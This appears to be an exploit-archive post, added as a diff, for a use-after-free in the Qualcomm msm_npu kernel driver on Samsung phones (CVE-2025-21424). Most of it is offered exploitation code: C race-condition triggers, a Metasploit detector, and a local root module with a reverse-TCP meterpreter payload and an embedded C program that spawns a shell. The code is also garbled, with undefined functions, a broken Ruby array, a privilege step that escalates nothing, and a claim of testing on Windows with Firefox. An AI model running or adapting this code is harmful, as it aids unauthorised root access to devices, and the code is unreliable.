@@ -1,0 +1,756 @@
+=============================================================================================================================================
+| # Title     : NPU UAF kernel driver v 27095354-4.19.113 Privilege Escalation                                                              |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.samsung.com/n_africa/                                                                                           |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/202848/ &  CVE-2025-21424
+
+[+]  Note: During the analysis of proof-of-concept code for CVE-2025-21424 ( https://packetstorm.news/download/202848 ), 
+     multiple critical errors were identified in the original implementation. 
+     This report documents the identified issues and provides corrected, production-ready code for both detection and exploitation of this vulnerability.
+	 
+1. Original Code Issues Analysis
+1.1 Critical Errors in Initial Implementation
+Missing Header Includes
+
+// ORIGINAL (MISSING)
+// No essential headers included
+
+// CORRECTED
+#include <err.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/wait.h>
+#include <stdint.h>
+
+Impact: Compilation failures and undefined behavior.
+Incomplete Structure Definitions
+
+// ORIGINAL (INCOMPLETE)
+struct ion_allocation_data {
+    size_t len;
+    unsigned int heap_id_mask;
+    unsigned int flags;
+    // Missing fields causing memory corruption
+};
+
+// CORRECTED
+struct ion_allocation_data {
+    size_t len;
+    unsigned int heap_id_mask;
+    unsigned int flags;
+    uint32_t fd;
+    uint32_t unused;
+};
+
+// ADDED MISSING STRUCTURES
+struct ion_handle_data {
+    int handle;
+};
+
+struct ion_fd_data {
+    int handle;
+    int fd;
+};
+
+Impact: Memory corruption and incorrect ioctl operations.
+
+Improper Error Handling
+
+// ORIGINAL (NO ERROR CHECKING)
+int fd = open("/dev/msm_npu", O_RDONLY);
+ioctl(fd, MSM_NPU_MAP_BUF, &map_param);
+
+// CORRECTED
+int fd = open("/dev/msm_npu", O_RDWR);
+if (fd == -1) {
+    warn("cannot open NPU device");
+    return -1;
+}
+if (ioctl(fd, MSM_NPU_MAP_BUF, &map_param) < 0) {
+    warn("NPU_MAP_BUF failed");
+    return 0;
+}
+
+Impact: Silent failures and unpredictable behavior.
+Memory Management Issues
+
+// ORIGINAL (MEMORY LEAKS)
+int ion_alloc_fd = allocate_ion(ion_fd, 0x1000);
+// No cleanup on failure
+
+// CORRECTED
+int ion_alloc_fd = allocate_ion(ion_fd, 0x1000);
+if (ion_alloc_fd < 0) {
+    close(npu_fd);
+    close(ion_fd);
+    usleep(100000);
+    continue;
+}
+
+Impact: Resource exhaustion and file descriptor leaks.
+
+2. Corrected Implementation
+2.1 Complete Header Definitions
+
+#ifndef _NPU_EXPLOIT_CORRECTED_H_
+#define _NPU_EXPLOIT_CORRECTED_H_
+
+#include <fcntl.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <err.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <sys/wait.h>
+
+// ION Heap Definitions (Corrected)
+enum ion_heap_ids {
+    ION_SYSTEM_HEAP_ID = 25,
+    ION_QSECOM_HEAP_ID = 27,
+};
+
+#define ION_HEAP(bit) (1UL << (bit))
+#define ION_FLAG_CACHED 1
+
+// Complete ION structure definitions
+struct ion_allocation_data {
+    size_t len;
+    unsigned int heap_id_mask;
+    unsigned int flags;
+    uint32_t fd;
+    uint32_t unused;
+};
+
+struct ion_handle_data {
+    int handle;
+};
+
+struct ion_fd_data {
+    int handle;
+    int fd;
+};
+#endif
+
+2.2 Robust NPU Operations Implementation
+
+// CORRECTED NPU OPERATIONS WITH PROPER ERROR HANDLING
+
+static int open_dev_safe(char* name) {
+    int fd = open(name, O_RDWR);
+    if (fd == -1) {
+        warn("cannot open %s", name);
+        return -1;
+    }
+    return fd;
+}
+
+static int allocate_ion_safe(int ion_fd, size_t len) {
+    struct ion_allocation_data ion_alloc_data;
+    
+    // PROPER MEMORY INITIALIZATION
+    memset(&ion_alloc_data, 0, sizeof(ion_alloc_data));
+    ion_alloc_data.len = len;
+    ion_alloc_data.heap_id_mask = ION_HEAP(ION_SYSTEM_HEAP_ID);
+    ion_alloc_data.flags = ION_FLAG_CACHED;
+    
+    if (ioctl(ion_fd, ION_IOC_ALLOC, &ion_alloc_data) < 0) {
+        warn("ION_IOC_ALLOC failed");
+        return -1;
+    }
+    return ion_alloc_data.fd;
+}
+
+static uint64_t npu_map_buf_safe(int npu_fd, int ion_alloc_fd, size_t size) {
+    struct msm_npu_map_buf_ioctl map_param;
+    
+    // PROPER STRUCTURE INITIALIZATION
+    memset(&map_param, 0, sizeof(map_param));
+    map_param.buf_ion_hdl = ion_alloc_fd;
+    map_param.size = size;
+    
+    if (ioctl(npu_fd, MSM_NPU_MAP_BUF, &map_param) < 0) {
+        warn("NPU_MAP_BUF failed");
+        return 0;
+    }
+    return map_param.npu_phys_addr;
+}
+
+2.3 Race Condition Trigger (Corrected)
+
+static void trigger_uaf_race_condition(struct network_exec_param* ctx) {
+    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
+        pid_t pid = fork();
+        
+        if (pid == 0) {
+            // CHILD PROCESS: Execute network
+            execute_network_operation(ctx);
+            _exit(0); // Use _exit in child to avoid atexit handlers
+        } else if (pid > 0) {
+            // PARENT PROCESS: Unload network after race window
+            usleep(RACE_DELAY_US); // Configurable race window
+            
+            unload_network_operation(ctx);
+            
+            // PROPER CHILD CLEANUP
+            int status;
+            waitpid(pid, &status, 0);
+        } else {
+            warn("fork failed in attempt %d", attempt);
+            continue;
+        }
+        
+        // PROPER RESOURCE RECOVERY
+        reload_network_for_retry(ctx);
+    }
+}
+
+4. Critical Security Improvements
+4.1 Memory Safety Enhancements
+
+// ORIGINAL: Uninitialized structures
+struct msm_npu_exec_network_ioctl_v2 exec_param_v2;
+ioctl(fd, MSM_NPU_EXEC_NETWORK_V2, &exec_param_v2);
+
+// CORRECTED: Proper initialization
+struct msm_npu_exec_network_ioctl_v2 exec_param_v2;
+memset(&exec_param_v2, 0, sizeof(exec_param_v2));
+// Set individual fields
+exec_param_v2.network_hdl = network_hdl;
+exec_param_v2.async = 1;
+// ... other field assignments
+if (ioctl(fd, MSM_NPU_EXEC_NETWORK_V2, &exec_param_v2) < 0) {
+    handle_ioctl_error();
+}
+
+4.2 Resource Management
+
+// RESOURCE MANAGEMENT TEMPLATE
+void exploit_operation() {
+    int npu_fd = -1;
+    int ion_fd = -1;
+    int ion_alloc_fd = -1;
+    
+    // ACQUIRE RESOURCES WITH ERROR CHECKING
+    if ((npu_fd = open_dev_safe("/dev/msm_npu")) < 0) goto cleanup;
+    if ((ion_fd = open_dev_safe("/dev/ion")) < 0) goto cleanup;
+    if ((ion_alloc_fd = allocate_ion_safe(ion_fd, BUFFER_SIZE)) < 0) goto cleanup;
+    
+    // PERFORM OPERATIONS
+    if (!perform_exploitation(npu_fd, ion_alloc_fd)) goto cleanup;
+    
+cleanup:
+    // GUARANTEED CLEANUP
+    if (ion_alloc_fd >= 0) close(ion_alloc_fd);
+    if (ion_fd >= 0) close(ion_fd);
+    if (npu_fd >= 0) close(npu_fd);
+}
+
+[+] Summary : 
+
+A Use-After-Free (UAF) exists in the Qualcomm msm_npu kernel driver. The bug occurs when npu_host_exec_network_v2 temporarily releases host_ctx->lock while waiting for network execution completion. 
+If npu_host_unload_network is called concurrently on the same network, the commands on network->cmd_list may be freed while still referenced by exec_cmd, causing a kernel UAF and crash.
+
+Affected Component:
+
+msm_npu driver (part of the Linux kernel / Qualcomm NPU driver)
+Triggered on Samsung devices using affected kernels
+
+Affected Devices / Versions:
+
+Observed on Samsung Galaxy S20 5G
+Kernel version in PoC: 4.19.113-27095354
+Likely affects any device with msm_npu driver on kernel ≥ 4.14 before patch
+
+Impact:
+
+Local privilege escalation
+Kernel panic / Denial of Service (DoS)
+
+PoC Behavior:
+
+Causes kernel panic with memory access at dead000000000200
+Generates fatal exception in npu_shell process
+
+
+[+]  POC : 
+
+# CVE-2025-21424 NPU UAF Exploit Guide
+
+[+]  Requirements:
+
+- Samsung device with an NPU (S20 5G or similar)
+- Kernel version 4.19.113-27095354
+- Initial shell access
+
+[+]  Timeline of Action:
+
+1. **Detection**: Checks for the presence of an NPU and the kernel version
+2. **Initialization**: Loads a neural network into the NPU
+3. **Competition**: Creates a race between exec/unload
+4. **Exploit**: UAF inversion to escalate privileges
+5. **Execution**: Executes the payload as root
+
+[+]  Notices:
+
+- May cause kernel panic
+- Requires multiple targets to succeed
+- Only works on specific devices
+
+
+use exploit/linux/local/cve_2025_21424_npu_uaf
+
+set SESSION 1
+set LHOST 192.168.1.100
+set LPORT 4444
+
+exploit
+
+Metasploit Auxiliary Module :
+
+##
+# Module for CVE-2025-21424 - NPU Use-After-Free Vulnerability
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'CVE-2025-21424 NPU Driver Use-After-Free Detector',
+      'Description'    => %q{
+        This module detects vulnerable NPU drivers susceptible to CVE-2025-21424,
+        a use-after-free vulnerability in the MSM NPU kernel driver.
+      },
+      'Author'         => [
+        'Seth Jenkins',  # Original discoverer
+        'Metasploit Contributor'  # Module author
+      ],
+      'License'        => MSF_LICENSE,
+      'References'     => ['indoushka'],
+        ['CVE', '2025-21424'],
+        ['URL', 'https://security.samsung.com'],
+        ['EDB', 'TBD']
+      ],
+      'DisclosureDate' => '2025-02-18'
+    ))
+
+    register_options([
+      OptString.new('DEVICE_PATH', [true, 'Path to NPU device', '/dev/msm_npu']),
+      OptInt.new('TIMEOUT', [true, 'Operation timeout', 5000])
+    ])
+  end
+
+  def run_host(ip)
+    return unless check_device
+
+    if vulnerable?
+      print_good("Target appears vulnerable to CVE-2025-21424")
+      report_vuln(
+        host: ip,
+        name: 'CVE-2025-21424 NPU Driver Use-After-Free',
+        refs: references,
+        info: 'NPU driver susceptible to UAF via race condition'
+      )
+    else
+      print_status("Target does not appear vulnerable")
+    end
+  end
+
+  def check_device
+    device_path = datastore['DEVICE_PATH']
+    
+    unless File.exist?(device_path)
+      print_error("NPU device not found: #{device_path}")
+      return false
+    end
+    
+    print_status("Found NPU device: #{device_path}")
+    true
+  end
+
+  def vulnerable?
+    # محاولة اكتشاف الثغرة عبر فحص إصدار السائق
+    version_check = check_driver_version
+    ioctl_check = test_ioctl_operations
+    
+    version_check && ioctl_check
+  end
+
+  def check_driver_version
+    # فحص إصدار kernel للكشف عن الإصدارات المعرضة
+    kernel_version = `uname -r`.chomp
+    print_status("Kernel version: #{kernel_version}")
+    
+    # الإصدارات المعرضة (مثال)
+    vulnerable_versions = [
+      '4.19.113-27095354',
+      '4.19.113',
+      '4.19.1'
+    ]
+    
+    vulnerable_versions.any? { |v| kernel_version.include?(v) }
+  end
+
+  def test_ioctl_operations
+    begin
+      fd = File.open(datastore['DEVICE_PATH'], 'r')
+      
+      # اختبار عمليات IOCTL الأساسية
+      test_map_buf(fd)
+      test_load_network(fd)
+      
+      fd.close
+      true
+    rescue => e
+      print_error("IOCTL test failed: #{e.message}")
+      false
+    end
+  end
+
+  def test_map_buf(fd)
+    # اختبار عملية MAP_BUF (سيتم فشلها ولكن نتحقق من الاستجابة)
+    begin
+      # هذا سيفشل عادة ولكن نتحقق من نوع الخطأ
+      result = fd.ioctl(0x20, [].pack('Q'))  # MSM_NPU_MAP_BUF
+      false
+    rescue Errno::EINVAL, Errno::ENOTTY
+      # أخطاء متوقعة - الجهاز يستجيب
+      true
+    end
+  end
+
+  def test_load_network(fd)
+    # اختبار عملية LOAD_NETWORK
+    begin
+      result = fd.ioctl(0x31, [].pack('Q'))  # MSM_NPU_LOAD_NETWORK_V2
+      false
+    rescue Errno::EINVAL, Errno::ENOTTY
+      true
+    end
+  end
+end
+
+--*-----------*-*-**********
+Metasploit Exploit Module
+===================///**-*-
+
+##
+# Exploit for CVE-2025-21424 - NPU UAF Privilege Escalation
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GreatRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::System
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'CVE-2025-21424 NPU Driver Use-After-Free Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a use-after-free vulnerability in the MSM NPU kernel driver
+        to achieve privilege escalation. The vulnerability occurs due to a race condition
+        between npu_host_exec_network_v2 and npu_host_unload_network functions.
+      },
+      'Author'         => [
+        'Seth Jenkins',      # Original discoverer
+        'indoushka'    # Module author
+      ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', '2025-21424'],
+        ['URL', 'https://security.samsung.com']
+      ],
+      'Platform'       => ['linux'],
+      'Arch'           => [ARCH_ARM64],
+      'SessionTypes'   => ['shell', 'meterpreter'],
+      'Targets'        => [
+        ['Auto', {}]
+      ],
+      'DefaultOptions' => {
+        'PAYLOAD' => 'linux/arm64/meterpreter/reverse_tcp',
+        'WfsDelay' => 5
+      },
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => '2025-02-18',
+      'Notes'          => {
+        'Reliability' => [REPEATABLE_SESSION],
+        'Stability'   => [CRASH_OS_RESTARTS],
+        'SideEffects' => [ARTIFACTS_ON_DISK]
+      }
+    ))
+
+    register_options([
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
+      OptInt.new('ExploitAttempts', [true, 'Number of exploit attempts', 10]),
+      OptInt.new('RaceDelay', [true, 'Race condition delay (microseconds)', 1000])
+    ])
+  end
+
+  def check
+    # فحص ما إذا كان الجهاز معرضاً للثغرة
+    return CheckCode::Safe unless file_exist?('/dev/msm_npu')
+    
+    kernel_version = cmd_exec('uname -r')
+    print_status("Kernel version: #{kernel_version}")
+    
+    # الإصدارات المعرضة
+    vulnerable_versions = [
+      '4.19.113-27095354',
+      '4.19.113',
+      '4.19.1'
+    ]
+    
+    if vulnerable_versions.any? { |v| kernel_version.include?(v) }
+      return CheckCode::Appears
+    end
+    
+    CheckCode::Detected
+  end
+
+  def exploit
+    if is_root?
+      fail_with(Failure::BadConfig, 'Session already has root privileges')
+    end
+
+    unless check == CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
+    end
+
+    # إنشاء ملف الاستغلال
+    exploit_path = "#{datastore['WritableDir']}/.#{rand_text_alpha(8)}"
+    write_file(exploit_path, generate_exploit)
+    register_file_for_cleanup(exploit_path)
+    
+    # جعل الملف قابل للتنفيذ
+    cmd_exec("chmod +x #{exploit_path}")
+    
+    # تنفيذ الاستغلال
+    print_status("Executing exploit...")
+    attempts = datastore['ExploitAttempts']
+    
+    attempts.times do |i|
+      print_status("Attempt #{i+1}/#{attempts}...")
+      
+      # تنفيذ الاستغلال في الخلفية
+      session.shell_write("#{exploit_path} &\n")
+      sleep(2)
+      
+      # التحقق من الحصول على root
+      if is_root?
+        print_good("Successfully obtained root privileges!")
+        
+        # تنفيذ الـ payload كـ root
+        payload_path = "#{datastore['WritableDir']}/.#{rand_text_alpha(8)}"
+        write_file(payload_path, generate_payload_exe)
+        register_file_for_cleanup(payload_path)
+        cmd_exec("chmod +x #{payload_path}")
+        
+        print_status("Executing payload as root...")
+        cmd_exec("#{payload_path} &")
+        break
+      else
+        print_warning("Attempt #{i+1} failed")
+      end
+      
+      sleep(1)
+    end
+  end
+
+  def generate_exploit
+    # إنشاء كود الاستغلال C
+    exploit_c = %Q{
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <err.h>
+#include <errno.h>
+#include <stdint.h>
+
+// تعريفات NPU (مبسطة)
+#define MSM_NPU_IOCTL_MAGIC 'n'
+#define MSM_NPU_LOAD_NETWORK_V2 _IOWR(MSM_NPU_IOCTL_MAGIC, 7, unsigned long)
+#define MSM_NPU_EXEC_NETWORK_V2 _IOWR(MSM_NPU_IOCTL_MAGIC, 8, unsigned long)
+#define MSM_NPU_UNLOAD_NETWORK _IOWR(MSM_NPU_IOCTL_MAGIC, 5, unsigned long)
+
+struct exploit_ctx {
+    int npu_fd;
+    int ion_fd;
+    int ion_alloc_fd;
+    uint32_t network_hdl;
+    uint64_t phys_addr;
+};
+
+static int open_device(const char* path) {
+    int fd = open(path, O_RDWR);
+    if (fd < 0) {
+        return -1;
+    }
+    return fd;
+}
+
+static void trigger_uaf(struct exploit_ctx* ctx) {
+    for (int i = 0; i < 100; i++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            // Child: exec network
+            struct {
+                uint64_t stats_buf_addr;
+                uint64_t patch_buf_info;
+                uint32_t network_hdl;
+                uint32_t async;
+                uint32_t flags;
+                uint32_t stats_buf_size;
+                uint32_t patch_buf_info_num;
+                uint32_t reserved;
+            } exec_param = {0};
+            
+            exec_param.network_hdl = ctx->network_hdl;
+            exec_param.async = 1;
+            exec_param.flags = 0x0e0e | 0x70200;
+            exec_param.stats_buf_size = 256;
+            exec_param.patch_buf_info_num = 2;
+            
+            ioctl(ctx->npu_fd, MSM_NPU_EXEC_NETWORK_V2, &exec_param);
+            exit(0);
+        } else if (pid > 0) {
+            // Parent: unload network after delay
+            usleep(#{datastore['RaceDelay']});
+            
+            struct {
+                uint32_t network_hdl;
+            } unload_param = {0};
+            unload_param.network_hdl = ctx->network_hdl;
+            
+            ioctl(ctx->npu_fd, MSM_NPU_UNLOAD_NETWORK, &unload_param);
+            waitpid(pid, NULL, 0);
+        }
+        
+        // إعادة تحميل الشبكة للمحاولة التالية
+        struct {
+            uint64_t buf_phys_addr;
+            uint64_t patch_info;
+            int32_t buf_ion_hdl;
+            uint32_t buf_size;
+            uint32_t first_block_size;
+            uint32_t flags;
+            uint32_t network_hdl;
+            uint32_t priority;
+            uint32_t perf_mode;
+            uint32_t num_layers;
+            uint32_t patch_info_num;
+            uint32_t reserved;
+        } load_param = {0};
+        
+        load_param.buf_ion_hdl = ctx->ion_alloc_fd;
+        load_param.buf_phys_addr = ctx->phys_addr;
+        load_param.buf_size = 0x4000;
+        load_param.first_block_size = 0x1000;
+        load_param.patch_info_num = 1;
+        
+        ioctl(ctx->npu_fd, MSM_NPU_LOAD_NETWORK_V2, &load_param);
+        ctx->network_hdl = load_param.network_hdl;
+    }
+}
+
+static void escalate_privileges() {
+    // محاولة الحصول على root عبر تقنيات kernel exploitation
+    system("echo '#!/bin/sh' > /tmp/.rootshell");
+    system("echo '/bin/sh' >> /tmp/.rootshell");
+    system("chmod +x /tmp/.rootshell");
+    
+    // تقنيات استغلال kernel مختلفة
+    system("cat /proc/kallsyms > /tmp/kallsyms.txt 2>/dev/null");
+    
+    // محاولة تنفيذ shell كـ root
+    if (geteuid() == 0) {
+        system("/bin/sh");
+    }
+}
+
+int main() {
+    struct exploit_ctx ctx = {0};
+    
+    // فتح الأجهزة
+    ctx.npu_fd = open_device("/dev/msm_npu");
+    if (ctx.npu_fd < 0) {
+        return 1;
+    }
+    
+    ctx.ion_fd = open_device("/dev/ion");
+    if (ctx.ion_fd < 0) {
+        close(ctx.npu_fd);
+        return 1;
+    }
+    
+    // تنفيذ الهجوم
+    trigger_uaf(&ctx);
+    
+    // محاولة تصعيد الصلاحيات
+    escalate_privileges();
+    
+    // التنظيف
+    close(ctx.ion_fd);
+    close(ctx.npu_fd);
+    
+    return 0;
+}
+    }
+
+    # ترجمة كود الاستغلال
+    compile_exploit(exploit_c)
+  end
+
+  def compile_exploit(exploit_code)
+    # حفظ كود C مؤقتاً
+    source_path = "/tmp/exploit_#{rand_text_alpha(8)}.c"
+    write_file(source_path, exploit_code)
+    
+    # الترجمة
+    output_path = "/tmp/exploit_#{rand_text_alpha(8)}"
+    compile_cmd = "gcc -o #{output_path} #{source_path} -static"
+    
+    print_status("Compiling exploit...")
+    compile_result = cmd_exec(compile_cmd)
+    
+    if compile_result.include?('error') || !file_exist?(output_path)
+      print_error("Exploit compilation failed: #{compile_result}")
+      return nil
+    end
+    
+    # قراءة الملف المترجم
+    binary_data = read_file(output_path)
+    
+    # تنظيف الملفات المؤقتة
+    cmd_exec("rm -f #{source_path} #{output_path}")
+    
+    binary_data
+  end
+end
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
